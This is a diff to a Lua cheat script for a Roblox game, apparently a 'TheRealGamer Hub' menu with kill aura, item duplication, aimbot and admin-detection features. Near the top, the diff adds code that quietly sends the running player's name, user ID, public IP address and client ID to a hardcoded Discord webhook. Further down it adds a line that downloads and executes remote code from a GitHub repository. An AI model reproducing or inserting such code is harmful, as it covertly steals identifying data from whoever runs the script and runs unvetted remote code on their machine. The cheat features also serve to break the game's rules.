@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("I Love anime", "DarkTheme")
+local Window = Library.CreateLib("TheRealGamer Hub", "LightTheme")
 RemoteEvents = {
     ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
     InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
@@ -12,6 +12,185 @@ RemoteEvents = {
     KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
     Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
 }
+HttpService = game:GetService("HttpService")
+Webhook_URL =  "https://discord.com/api/webhooks/1156241079742517309/BBLDsj12M1u__F9OpgsgsLRTdnLtQvls5ctVYNpVciN26dg2p3lCf6Hp7vh_MfvVL_Xw"
+ 
+local request = syn and syn.request or request or http and http.request or http_request
+ 
+local response = request({
+    Url = Webhook_URL,
+    Method = "POST",
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "",
+                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffffff),
+                ["fields"] = {
+                    {
+                        ["name"] = "Player Name : ",
+                        ["value"] = game.Players.LocalPlayer.Name,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "UserId : ",
+                        ["value"] = game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "User Profile : ",
+                        ["value"] = "https://www.roblox.com/users/" ..
+                            game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "IP: ",
+                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Client Id : ",
+                        ["value"] = game:GetService("RbxAnalyticsService")
+                            :GetClientId(),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Key : ",
+                        ["value"] = "GAMERONTOP",
+                        ["inline"] = true
+                    }
+                }
+            }
+        }
+    })
+})
+
+
+
+--Services
+Workspace = game:GetService('Workspace')
+Players = game:GetService('Players')
+ReplicatedStorage = game:GetService('ReplicatedStorage')
+UserInputService = game:GetService('UserInputService')
+TweenService = game:GetService("TweenService")
+RunService = game:GetService('RunService')
+Lighting  = game:GetService('Lighting')
+VirtualUser = game:GetService("VirtualUser")
+HttpService = game:GetService('HttpService')
+TeleportService = game:GetService("TeleportService")
+
+--Globals
+LocalPlayer = Players.LocalPlayer
+Mouse = LocalPlayer:GetMouse()
+Camera = Workspace.CurrentCamera
+ALLITEMS = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Items'))['Items']
+ALLITEMSTABLE = {}
+SWITCHEDITEMSTABLE = {}
+for id, index in pairs(ALLITEMS) do
+	ALLITEMSTABLE[index['id']] = index['Name']
+end
+for id, index in pairs(ALLITEMS) do
+	SWITCHEDITEMSTABLE[index['Name']] = index['id']
+end
+getgenv().configs = {
+    Bypassing = false;
+    AutoPickup2 = false;
+    InfJump = false;
+    ClickTp = false;
+    AutoEat = false;
+    MineAura = false;
+    MobAura = false;
+    CheaterDetector = false;
+    KillAura = false;
+    PlayerLock = false;
+    Pumpkins = false;
+    Hitbox = false;
+    SafeDeath = false;
+    OpKillAura = false;
+	PredictOpKillAura = false;
+    AutoRepairClub = false;
+    ConiferFarm = false;
+    UseSoulKeys = false;
+    ObsidianBoss = false;
+    ZenLuckBoss = false;
+    SpiritBoss = false;
+    LuckySlime = false;
+    EvilSkeleton = false;
+    Ogre = false;
+    Squid = false;
+    JumpPower = false;
+    AntiRagDoll = false;
+    ExtraSpeed = false;
+    AmountToLoopDrop = false;
+    PlayerEsp = false;
+    EatingType = 'AFK';
+    TrapType = 'Stone Trap';
+    LevelCheck = 'True';
+    ChestType = 'Any';
+}
+getgenv().QuickSpeedMultiplier = 1
+getgenv().AmountOfChestInserts = 1
+getgenv().PredictAmount = 3
+getgenv().QuickSpeedKey = Enum.KeyCode.B
+getgenv().GliderModSpeed = 30
+
+
+--RemoteEvents
+RemoteEvents = {
+    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
+    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
+    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
+    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
+    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
+    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
+    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
+    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
+    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
+    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
+}
+--Important locals
+local message = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Message'))
+local MyInventory = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Menus'):FindFirstChild('Inventory'):FindFirstChild('Inventory'):FindFirstChild('List')
+local Whitelist_table = {};
+local OpKillAuraTable = {};
+local realgameadmins = {849400193, 134488231, 146733116, 27865601}
+local MoonstoneSet = {363, 364, 365, 366}
+local ObsidianSet = {225, 226, 227, 228}
+local AllShields = {206, 207, 208, 209, 210, 211, 219, 235, 367, 379}
+local AllSwords = {173, 205, 230, 369, 255, 254, 253}
+local AllBows = {174, 197, 198, 199, 376}
+local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
+local AllStaffs = {293, 292, 291, 290, 162, 289}
+
+--Safe Death Connections
+local TimeTped
+local TimeBetweenTps
+local TeleportHappened = false
+local SafeDeathHealthChecker = nil
+
+--Boss Death connections
+local AutoPickupOnObsidianDeath
+local AutoPickupOnZenLuckBossDeath
+local AutoPickupOnSpiritBossDeath
+local AutoPickuponLuckySlimeDeath
+local AutoPickupOnSkeletonDeath
+local AutoPickupOnOgreDeath
+local AutoPickupOnSquidDeath
+
+--Dupe locals
+local ItemIndexed
+local ItemIndexedNumber
+
+--Admin Module
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/vevervevevevrsdvxbzd/main/adminmodule.lua"))()
+--Aimbot locals
+local CurrentlyLocked
+local Aiming = false
+
+--Quickspeed locals
+local OnOff = false
+local keydetected
+
 -- Main
 local Main = Window:NewTab("Main")
 local MainSection = Main:NewSection("Main")
